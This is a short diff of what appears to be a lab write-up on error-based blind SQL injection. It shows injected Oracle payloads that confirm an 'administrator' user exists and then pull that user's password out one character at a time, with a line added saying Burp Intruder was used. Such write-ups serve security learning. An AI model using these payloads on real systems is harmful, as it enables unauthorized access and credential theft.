@@ -16,7 +16,8 @@ then  <br>
 ' || (select '' from users where username='administrator') || '  <br>
 there's no error <br>
  <br>
-##  3) bruteforce the password character by character 
+##  3) bruteforce the password character by character
+we started to bruteforce the password index and every characterby burp intruder
 3'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' <br>
  <br>
 ![image](https://github.com/user-attachments/assets/846b2816-119f-4bf7-b615-9175819904f8)
